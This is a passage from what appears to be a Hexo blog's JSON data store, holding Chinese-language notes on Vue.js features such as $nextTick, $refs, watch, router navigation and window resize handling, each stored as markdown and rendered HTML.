DOM`。\n\n所以就衍生出了这个获取更新后的DOM的Vue方法。所以放在Vue.nextTick()回调函数中的执行的应该是会`对DOM进行操作的 js代码`.\n\n### 什么时候需要用的`Vue.nextTick()` ?\n\n在Vue生命周期 `created()`钩子函数进行的`DOM操作`一定要放在`Vue.nextTick()`的回调函数中。\n\n原因是 `created()`钩子函数执行时, DOM 并未进行任何渲染，此时进行DOM操作无异于徒劳，所以此处一定要将DOM操作的js代码放进`Vue.nextTick()的回调函数中`。\n\n与之对应的就是`mounted()`钩子函数，因为该钩子函数执行时所有的DOM挂载已完成。\n\n使用时机：el 被新创建的 vm.$el 替换，并挂载到实例上去之后调用该钩子函数，此时页面并未全部渲染。\n\n在某个动作有可能`改变DOM元素结构`的时候，对`DOM一系列的js操作`都要放进`Vue.nextTick()的回调函数`中.","source":"_posts/FrontEnd/WebFrameWork/Vue/Vue-$nextTick()作用.md","raw":"---\ntitle: Vue-$nextTick()作用\ndate: 2018-07-14 09:44:23\ntags: $nextTick()作用\ncategories: Vue\n---\n## [Vue中`$nextTick()`作用](https://blog.csdn.net/shuidinaozhongyan/article/details/72630573)\n\n官方文档解释如下：\n\n在下次 DOM `更新循环结束之后`执行延迟回调。在修改数据之后立即使用这个方法，获取`更新后的 DOM`。\n\n所以就衍生出了这个获取更新后的DOM的Vue方法。所以放在Vue.nextTick()回调函数中的执行的应该是会`对DOM进行操作的 js代码`.\n\n### 什么时候需要用的`Vue.nextTick()` ?\n\n在Vue生命周期 `created()`钩子函数进行的`DOM操作`一定要放在`Vue.nextTick()`的回调函数中。\n\n原因是 `created()`钩子函数执行时, DOM 并未进行任何渲染，此时进行DOM操作无异于徒劳，所以此处一定要将DOM操作的js代码放进`Vue.nextTick()的回调函数中`。\n\n与之对应的就是`mounted()`钩子函数，因为该钩子函数执行时所有的DOM挂载已完成。\n\n使用时机：el 被新创建的 vm.$el 替换，并挂载到实例上去之后调用该钩子函数，此时页面并未全部渲染。\n\n在某个动作有可能`改变DOM元素结构`的时候，对`DOM一系列的js操作`都要放进`Vue.nextTick()的回调函数`中.","slug":"FrontEnd/WebFrameWork/Vue/Vue-$nextTick()作用","published":1,"updated":"2018-09-05T06:33:18.481Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmry2i00e8zodvgd6ni5z4","content":"<h2 id=\"Vue中-nextTick-作用\"><a href=\"#Vue中-nextTick-作用\" class=\"headerlink\" title=\"Vue中$nextTick()作用\"></a><a href=\"https://blog.csdn.net/shuidinaozhongyan/article/details/72630573\" target=\"_blank\" rel=\"noopener\">Vue中<code>$nextTick()</code>作用</a></h2><p>官方文档解释如下：</p>\n<p>在下次 DOM <code>更新循环结束之后</code>执行延迟回调。在修改数据之后立即使用这个方法，获取<code>更新后的 DOM</code>。</p>\n<p>所以就衍生出了这个获取更新后的DOM的Vue方法。所以放在Vue.nextTick()回调函数中的执行的应该是会<code>对DOM进行操作的 js代码</code>.</p>\n<h3 id=\"什么时候需要用的Vue-nextTick\"><a href=\"#什么时候需要用的Vue-nextTick\" class=\"headerlink\" title=\"什么时候需要用的Vue.nextTick() ?\"></a>什么时候需要用的<code>Vue.nextTick()</code> ?</h3><p>在Vue生命周期 <code>created()</code>钩子函数进行的<code>DOM操作</code>一定要放在<code>Vue.nextTick()</code>的回调函数中。</p>\n<p>原因是 <code>created()</code>钩子函数执行时, DOM 并未进行任何渲染，此时进行DOM操作无异于徒劳，所以此处一定要将DOM操作的js代码放进<code>Vue.nextTick()的回调函数中</code>。</p>\n<p>与之对应的就是<code>mounted()</code>钩子函数，因为该钩子函数执行时所有的DOM挂载已完成。</p>\n<p>使用时机：el 被新创建的 vm.$el 替换，并挂载到实例上去之后调用该钩子函数，此时页面并未全部渲染。</p>\n<p>在某个动作有可能<code>改变DOM元素结构</code>的时候，对<code>DOM一系列的js操作</code>都要放进<code>Vue.nextTick()的回调函数</code>中.</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"Vue中-nextTick-作用\"><a href=\"#Vue中-nextTick-作用\" class=\"headerlink\" title=\"Vue中$nextTick()作用\"></a><a href=\"https://blog.csdn.net/shuidinaozhongyan/article/details/72630573\" target=\"_blank\" rel=\"noopener\">Vue中<code>$nextTick()</code>作用</a></h2><p>官方文档解释如下：</p>\n<p>在下次 DOM <code>更新循环结束之后</code>执行延迟回调。在修改数据之后立即使用这个方法，获取<code>更新后的 DOM</code>。</p>\n<p>所以就衍生出了这个获取更新后的DOM的Vue方法。所以放在Vue.nextTick()回调函数中的执行的应该是会<code>对DOM进行操作的 js代码</code>.</p>\n<h3 id=\"什么时候需要用的Vue-nextTick\"><a href=\"#什么时候需要用的Vue-nextTick\" class=\"headerlink\" title=\"什么时候需要用的Vue.nextTick() ?\"></a>什么时候需要用的<code>Vue.nextTick()</code> ?</h3><p>在Vue生命周期 <code>created()</code>钩子函数进行的<code>DOM操作</code>一定要放在<code>Vue.nextTick()</code>的回调函数中。</p>\n<p>原因是 <code>created()</code>钩子函数执行时, DOM 并未进行任何渲染，此时进行DOM操作无异于徒劳，所以此处一定要将DOM操作的js代码放进<code>Vue.nextTick()的回调函数中</code>。</p>\n<p>与之对应的就是<code>mounted()</code>钩子函数，因为该钩子函数执行时所有的DOM挂载已完成。</p>\n<p>使用时机：el 被新创建的 vm.$el 替换，并挂载到实例上去之后调用该钩子函数，此时页面并未全部渲染。</p>\n<p>在某个动作有可能<code>改变DOM元素结构</code>的时候，对<code>DOM一系列的js操作</code>都要放进<code>Vue.nextTick()的回调函数</code>中.</p>\n"},{"title":"Vue-$refs用法","date":"2018-07-14T01:44:23.000Z","_content":"## [Vue `$refs`基本用法](https://www.cnblogs.com/xueweijie/p/6907676.html)\n\n````\n<div id=\"app\">\n    <input type=\"text\" ref=\"input1\"/>\n    <button @click=\"add\">添加</button>\n</div>\n````\n\n````\n<script>\n    new Vue({\n    el: \"#app\",\n    methods:{\n    add:function(){\n        this.$refs.input1.value =\"22\"; //this.$refs.input1  减少获取dom节点的消耗\n        }\n    }\n    })\n</script>\n````","source":"_posts/FrontEnd/WebFrameWork/Vue/Vue-$refs作用.md","raw":"---\ntitle: Vue-$refs用法\ndate: 2018-07-14 09:44:23\ntags: $refs用法\ncategories: VUE\n---\n## [Vue `$refs`基本用法](https://www.cnblogs.com/xueweijie/p/6907676.html)\n\n````\n<div id=\"app\">\n    <input type=\"text\" ref=\"input1\"/>\n    <button @click=\"add\">添加</button>\n</div>\n````\n\n````\n<script>\n    new Vue({\n    el: \"#app\",\n    methods:{\n    add:function(){\n        this.$refs.input1.value =\"22\"; //this.$refs.input1  减少获取dom节点的消耗\n        }\n    }\n    })\n</script>\n````","slug":"FrontEnd/WebFrameWork/Vue/Vue-$refs作用","published":1,"updated":"2018-09-05T06:33:18.481Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmry2k00eazodv524iacvd","content":"<h2 id=\"Vue-refs基本用法\"><a href=\"#Vue-refs基本用法\" class=\"headerlink\" title=\"Vue $refs基本用法\"></a><a href=\"https://www.cnblogs.com/xueweijie/p/6907676.html\" target=\"_blank\" rel=\"noopener\">Vue <code>$refs</code>基本用法</a></h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;div id=&quot;app&quot;&gt;</span><br><span class=\"line\">    &lt;input type=&quot;text&quot; ref=&quot;input1&quot;/&gt;</span><br><span class=\"line\">    &lt;button @click=&quot;add&quot;&gt;添加&lt;/button&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">    new Vue(&#123;</span><br><span class=\"line\">    el: &quot;#app&quot;,</span><br><span class=\"line\">    methods:&#123;</span><br><span class=\"line\">    add:function()&#123;</span><br><span class=\"line\">        this.$refs.input1.value =&quot;22&quot;; //this.$refs.input1  减少获取dom节点的消耗</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<h2 id=\"Vue-refs基本用法\"><a href=\"#Vue-refs基本用法\" class=\"headerlink\" title=\"Vue $refs基本用法\"></a><a href=\"https://www.cnblogs.com/xueweijie/p/6907676.html\" target=\"_blank\" rel=\"noopener\">Vue <code>$refs</code>基本用法</a></h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;div id=&quot;app&quot;&gt;</span><br><span class=\"line\">    &lt;input type=&quot;text&quot; ref=&quot;input1&quot;/&gt;</span><br><span class=\"line\">    &lt;button @click=&quot;add&quot;&gt;添加&lt;/button&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">    new Vue(&#123;</span><br><span class=\"line\">    el: &quot;#app&quot;,</span><br><span class=\"line\">    methods:&#123;</span><br><span class=\"line\">    add:function()&#123;</span><br><span class=\"line\">        this.$refs.input1.value =&quot;22&quot;; //this.$refs.input1  减少获取dom节点的消耗</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>"},{"title":"Vue-动态路由匹配","date":"2018-05-31T07:41:49.000Z","_content":"","source":"_posts/FrontEnd/WebFrameWork/Vue/Vue-动态路由匹配.md","raw":"---\ntitle: Vue-动态路由匹配\ndate: 2018-05-31 15:41:49\ntags:\ncategories:\n---\n","slug":"FrontEnd/WebFrameWork/Vue/Vue-动态路由匹配","published":1,"updated":"2018-09-05T06:33:18.482Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmry2m00eezodv16tpxaes","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"Vue引用本地图片","date":"2018-07-14T02:37:39.000Z","_content":"## Vue引用本地图片\n````\nimport logoH from '@/images/logo-min.jpg' // 首先得静态引入\n````\n\n````\nthis.$store.commit('setAvator', logoH); // 其次再直接引用变量\n````","source":"_posts/FrontEnd/WebFrameWork/Vue/Vue引用本地图片.md","raw":"---\ntitle: Vue引用本地图片\ndate: 2018-07-14 10:37:39\ntags: Vue引用本地图片\ncategories: VUE\n---\n## Vue引用本地图片\n````\nimport logoH from '@/images/logo-min.jpg' // 首先得静态引入\n````\n\n````\nthis.$store.commit('setAvator', logoH); // 其次再直接引用变量\n````","slug":"FrontEnd/WebFrameWork/Vue/Vue引用本地图片","published":1,"updated":"2018-09-05T06:33:18.482Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmry2o00ehzodvfarpejwy","content":"<h2 id=\"Vue引用本地图片\"><a href=\"#Vue引用本地图片\" class=\"headerlink\" title=\"Vue引用本地图片\"></a>Vue引用本地图片</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import logoH from &apos;@/images/logo-min.jpg&apos; // 首先得静态引入</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">this.$store.commit(&apos;setAvator&apos;, logoH); // 其次再直接引用变量</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<h2 id=\"Vue引用本地图片\"><a href=\"#Vue引用本地图片\" class=\"headerlink\" title=\"Vue引用本地图片\"></a>Vue引用本地图片</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import logoH from &apos;@/images/logo-min.jpg&apos; // 首先得静态引入</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">this.$store.commit(&apos;setAvator&apos;, logoH); // 其次再直接引用变量</span><br></pre></td></tr></table></figure>"},{"title":"Vue组件传参","date":"2018-07-20T01:36:16.000Z","_content":"","source":"_posts/FrontEnd/WebFrameWork/Vue/Vue组件传参.md","raw":"---\ntitle: Vue组件传参\ndate: 2018-07-20 09:36:16\ntags: Vue组件传参\ncategories: VUE\n---\n","slug":"FrontEnd/WebFrameWork/Vue/Vue组件传参","published":1,"updated":"2018-09-05T06:33:18.484Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmry2q00elzodv3oybs3kv","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"Watch用法详解","date":"2018-05-26T01:23:17.000Z","_content":"\nVue.js 提供了一个方法 `watch`，它用于观察`Vue实例`上的`数据变动`。对应一个对象，`键是观察表达式`，`值是对应回调`。\n值也可以是方法名，或者是对象，包含选项。具体的用法可以直接看下面的示例，简单直接。\n\n````\n<span style=\"color:#006600;\"><div id=\"app\">  \n    <input type=\"text\" v-model:value=\"childrens.name\" />  \n    <input type=\"text\" v-model:value=\"lastName\" />  \n</div>  \n  \n<script type=\"text/javascript\">     \n    var vm = new Vue( {  \n        el: '#app',  \n        data: {  \n            childrens: {  \n                name: '小强',  \n                age: 20,  \n                sex: '男'  \n            },  \n            tdArray:[\"1\",\"2\"],  \n            lastName:\"张三\"  \n        },  \n        watch:{  \n            childrens:{  \n                handler:function(val,oldval){  \n                    console.log(val.name)  \n                },  \n                deep:true//对象内部的属性监听，也叫深度监听  \n            },  \n            'childrens.name':function(val,oldval){  \n                console.log(val+\"aaa\")  \n            },//键路径必须加上引号  \n            lastName:function(val,oldval){  \n                console.log(this.lastName)  \n            }  \n        },//以V-model绑定数据时使用的数据变化监测  \n    } );  \n    vm.$watch(\"lastName\",function(val,oldval){  \n        console.log(val)  \n    })//主动调用$watch方法来进行数据监测</span>  \n</script>  \n````\n---\n[阅读原文](https://blog.csdn.net/itkingone/article/details/69568498)\n\n[另附: [Angular中使用$watch监听object属性值的变化](https://blog.csdn.net/u014291497/article/details/52245651)]\n\n---","source":"_posts/FrontEnd/WebFrameWork/Vue/Watch用法详解.md","raw":"---\ntitle: Watch用法详解\ndate: 2018-05-26 09:23:17\ntags: Watch-监听属性\ncategories: Vue-Watch\n---\n\nVue.js 提供了一个方法 `watch`，它用于观察`Vue实例`上的`数据变动`。对应一个对象，`键是观察表达式`，`值是对应回调`。\n值也可以是方法名，或者是对象，包含选项。具体的用法可以直接看下面的示例，简单直接。\n\n````\n<span style=\"color:#006600;\"><div id=\"app\">  \n    <input type=\"text\" v-model:value=\"childrens.name\" />  \n    <input type=\"text\" v-model:value=\"lastName\" />  \n</div>  \n  \n<script type=\"text/javascript\">     \n    var vm = new Vue( {  \n        el: '#app',  \n        data: {  \n            childrens: {  \n                name: '小强',  \n                age: 20,  \n                sex: '男'  \n            },  \n            tdArray:[\"1\",\"2\"],  \n            lastName:\"张三\"  \n        },  \n        watch:{  \n            childrens:{  \n                handler:function(val,oldval){  \n                    console.log(val.name)  \n                },  \n                deep:true//对象内部的属性监听，也叫深度监听  \n            },  \n            'childrens.name':function(val,oldval){  \n                console.log(val+\"aaa\")  \n            },//键路径必须加上引号  \n            lastName:function(val,oldval){  \n                console.log(this.lastName)  \n            }  \n        },//以V-model绑定数据时使用的数据变化监测  \n    } );  \n    vm.$watch(\"lastName\",function(val,oldval){  \n        console.log(val)  \n    })//主动调用$watch方法来进行数据监测</span>  \n</script>  \n````\n---\n[阅读原文](https://blog.csdn.net/itkingone/article/details/69568498)\n\n[另附: [Angular中使用$watch监听object属性值的变化](https://blog.csdn.net/u014291497/article/details/52245651)]\n\n---","slug":"FrontEnd/WebFrameWork/Vue/Watch用法详解","published":1,"updated":"2018-09-05T06:33:18.485Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmry2r00enzodvt5q23fox","content":"<p>Vue.js 提供了一个方法 <code>watch</code>，它用于观察<code>Vue实例</code>上的<code>数据变动</code>。对应一个对象，<code>键是观察表达式</code>，<code>值是对应回调</code>。<br>值也可以是方法名，或者是对象，包含选项。具体的用法可以直接看下面的示例，简单直接。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;span style=&quot;color:#006600;&quot;&gt;&lt;div id=&quot;app&quot;&gt;  </span><br><span class=\"line\">    &lt;input type=&quot;text&quot; v-model:value=&quot;childrens.name&quot; /&gt;  </span><br><span class=\"line\">    &lt;input type=&quot;text&quot; v-model:value=&quot;lastName&quot; /&gt;  </span><br><span class=\"line\">&lt;/div&gt;  </span><br><span class=\"line\">  </span><br><span class=\"line\">&lt;script type=&quot;text/javascript&quot;&gt;     </span><br><span class=\"line\">    var vm = new Vue( &#123;  </span><br><span class=\"line\">        el: &apos;#app&apos;,  </span><br><span class=\"line\">        data: &#123;  </span><br><span class=\"line\">            childrens: &#123;  </span><br><span class=\"line\">                name: &apos;小强&apos;,  </span><br><span class=\"line\">                age: 20,  </span><br><span class=\"line\">                sex: &apos;男&apos;  </span><br><span class=\"line\">            &#125;,  </span><br><span class=\"line\">            tdArray:[&quot;1&quot;,&quot;2&quot;],  </span><br><span class=\"line\">            lastName:&quot;张三&quot;  </span><br><span class=\"line\">        &#125;,  </span><br><span class=\"line\">        watch:&#123;  </span><br><span class=\"line\">            childrens:&#123;  </span><br><span class=\"line\">                handler:function(val,oldval)&#123;  </span><br><span class=\"line\">                    console.log(val.name)  </span><br><span class=\"line\">                &#125;,  </span><br><span class=\"line\">                deep:true//对象内部的属性监听，也叫深度监听  </span><br><span class=\"line\">            &#125;,  </span><br><span class=\"line\">            &apos;childrens.name&apos;:function(val,oldval)&#123;  </span><br><span class=\"line\">                console.log(val+&quot;aaa&quot;)  </span><br><span class=\"line\">            &#125;,//键路径必须加上引号  </span><br><span class=\"line\">            lastName:function(val,oldval)&#123;  </span><br><span class=\"line\">                console.log(this.lastName)  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">        &#125;,//以V-model绑定数据时使用的数据变化监测  </span><br><span class=\"line\">    &#125; );  </span><br><span class=\"line\">    vm.$watch(&quot;lastName&quot;,function(val,oldval)&#123;  </span><br><span class=\"line\">        console.log(val)  </span><br><span class=\"line\">    &#125;)//主动调用$watch方法来进行数据监测&lt;/span&gt;  </span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<hr>\n<p><a href=\"https://blog.csdn.net/itkingone/article/details/69568498\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n<p>[另附: <a href=\"https://blog.csdn.net/u014291497/article/details/52245651\" target=\"_blank\" rel=\"noopener\">Angular中使用$watch监听object属性值的变化</a>]</p>\n<hr>\n","site":{"data":{}},"excerpt":"","more":"<p>Vue.js 提供了一个方法 <code>watch</code>，它用于观察<code>Vue实例</code>上的<code>数据变动</code>。对应一个对象，<code>键是观察表达式</code>，<code>值是对应回调</code>。<br>值也可以是方法名，或者是对象，包含选项。具体的用法可以直接看下面的示例，简单直接。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;span style=&quot;color:#006600;&quot;&gt;&lt;div id=&quot;app&quot;&gt;  </span><br><span class=\"line\">    &lt;input type=&quot;text&quot; v-model:value=&quot;childrens.name&quot; /&gt;  </span><br><span class=\"line\">    &lt;input type=&quot;text&quot; v-model:value=&quot;lastName&quot; /&gt;  </span><br><span class=\"line\">&lt;/div&gt;  </span><br><span class=\"line\">  </span><br><span class=\"line\">&lt;script type=&quot;text/javascript&quot;&gt;     </span><br><span class=\"line\">    var vm = new Vue( &#123;  </span><br><span class=\"line\">        el: &apos;#app&apos;,  </span><br><span class=\"line\">        data: &#123;  </span><br><span class=\"line\">            childrens: &#123;  </span><br><span class=\"line\">                name: &apos;小强&apos;,  </span><br><span class=\"line\">                age: 20,  </span><br><span class=\"line\">                sex: &apos;男&apos;  </span><br><span class=\"line\">            &#125;,  </span><br><span class=\"line\">            tdArray:[&quot;1&quot;,&quot;2&quot;],  </span><br><span class=\"line\">            lastName:&quot;张三&quot;  </span><br><span class=\"line\">        &#125;,  </span><br><span class=\"line\">        watch:&#123;  </span><br><span class=\"line\">            childrens:&#123;  </span><br><span class=\"line\">                handler:function(val,oldval)&#123;  </span><br><span class=\"line\">                    console.log(val.name)  </span><br><span class=\"line\">                &#125;,  </span><br><span class=\"line\">                deep:true//对象内部的属性监听，也叫深度监听  </span><br><span class=\"line\">            &#125;,  </span><br><span class=\"line\">            &apos;childrens.name&apos;:function(val,oldval)&#123;  </span><br><span class=\"line\">                console.log(val+&quot;aaa&quot;)  </span><br><span class=\"line\">            &#125;,//键路径必须加上引号  </span><br><span class=\"line\">            lastName:function(val,oldval)&#123;  </span><br><span class=\"line\">                console.log(this.lastName)  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">        &#125;,//以V-model绑定数据时使用的数据变化监测  </span><br><span class=\"line\">    &#125; );  </span><br><span class=\"line\">    vm.$watch(&quot;lastName&quot;,function(val,oldval)&#123;  </span><br><span class=\"line\">        console.log(val)  </span><br><span class=\"line\">    &#125;)//主动调用$watch方法来进行数据监测&lt;/span&gt;  </span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<hr>\n<p><a href=\"https://blog.csdn.net/itkingone/article/details/69568498\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n<p>[另附: <a href=\"https://blog.csdn.net/u014291497/article/details/52245651\" target=\"_blank\" rel=\"noopener\">Angular中使用$watch监听object属性值的变化</a>]</p>\n<hr>\n"},{"title":"Vue路由跳转Render语法","date":"2018-07-21T06:05:38.000Z","_content":"## router-link之外的路由跳转方法\n````\nthis.$router.push({\n    path: `artical-modify/${params.row.articleID}`\n});\n````","source":"_posts/FrontEnd/WebFrameWork/Vue/Vue路由跳转Render语法.md","raw":"---\ntitle: Vue路由跳转Render语法\ndate: 2018-07-21 14:05:38\ntags: 路由跳转Render语法\ncategories: Vue\n---\n## router-link之外的路由跳转方法\n````\nthis.$router.push({\n    path: `artical-modify/${params.row.articleID}`\n});\n````","slug":"FrontEnd/WebFrameWork/Vue/Vue路由跳转Render语法","published":1,"updated":"2018-09-05T06:33:18.484Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmry2u00erzodvkg0vmr3y","content":"<h2 id=\"router-link之外的路由跳转方法\"><a href=\"#router-link之外的路由跳转方法\" class=\"headerlink\" title=\"router-link之外的路由跳转方法\"></a>router-link之外的路由跳转方法</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">this.$router.push(&#123;</span><br><span class=\"line\">    path: `artical-modify/$&#123;params.row.articleID&#125;`</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<h2 id=\"router-link之外的路由跳转方法\"><a href=\"#router-link之外的路由跳转方法\" class=\"headerlink\" title=\"router-link之外的路由跳转方法\"></a>router-link之外的路由跳转方法</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">this.$router.push(&#123;</span><br><span class=\"line\">    path: `artical-modify/$&#123;params.row.articleID&#125;`</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>"},{"title":"vue-resize","date":"2018-05-14T07:59:59.000Z","_content":"## 主要记录方案二：\n\n在vue 2.x 里面的时候，可以在 `mounted` 钩子中 全局监听 `resize` 事件，然后绑定的函数再做具体的处理。\n\n````\ndata(){\n    return {\n        clientHeight: '600px',\n    },\n},\nmounted() {\n    // 动态设置背景图的高度为浏览器可视区域高度\n\n    // 首先在Virtual DOM渲染数据时，设置下背景图的高度．\n    > this.clientHeight.height = `${document.documentElement.clientHeight}px`;\n    \n    // 然后监听window的resize事件．在浏览器窗口变化时再设置下背景图高度．\n    > const that = this;\n    > window.onresize = function temp() {\n    >     that.clientHeight = `${document.documentElement.clientHeight}px`;\n    > };\n},\n````\n\n-----------------\n[阅读原文](https://blog.csdn.net/qq_25386583/article/details/77161478)","source":"_posts/FrontEnd/WebFrameWork/Vue/vue-resize.md","raw":"---\ntitle: vue-resize\ndate: 2018-05-14 15:59:59\ntags: VueJs 监听 window.resize\ncategories: VUE\n---\n## 主要记录方案二：\n\n在vue 2.x 里面的时候，可以在 `mounted` 钩子中 全局监听 `resize` 事件，然后绑定的函数再做具体的处理。\n\n````\ndata(){\n    return {\n        clientHeight: '600px',\n    },\n},\nmounted() {\n    // 动态设置背景图的高度为浏览器可视区域高度\n\n    // 首先在Virtual DOM渲染数据时，设置下背景图的高度．\n    > this.clientHeight.height = `${document.documentElement.clientHeight}px`;\n    \n    // 然后监听window的resize事件．在浏览器窗口变化时再设置下背景图高度．\n    > const that = this;\n    > window.onresize = function temp() {\n    >     that.clientHeight = `${document.documentElement.clientHeight}px`;\n    > };\n},\n````\n\n-----------------\n[阅读原文](https://blog.csdn.net/qq_25386583/article/details/77161478)","slug":"FrontEnd/WebFrameWork/Vue/vue-resize","published":1,"updated":"2018-09-05T06:33:18.485Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmry2v00euzodv0ams4015","content":"<h2 id=\"主要记录方案二：\"><a href=\"#主要记录方案二：\" class=\"headerlink\" title=\"主要记录方案二：\"></a>主要记录方案二：</h2><p>在vue 2.x 里面的时候，可以在 <code>mounted</code> 钩子中 全局监听 <code>resize</code> 事件，然后绑定的函数再做具体的处理。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">data()&#123;</span><br><span class=\"line\">    return &#123;</span><br><span class=\"line\">        clientHeight: &apos;600px&apos;,</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">&#125;,</span><br><span class=\"line\">mounted() &#123;</span><br><span class=\"line\">    // 动态设置背景图的高度为浏览器可视区域高度</span><br><span class=\"line\"></span><br><span class=\"line\">    // 首先在Virtual 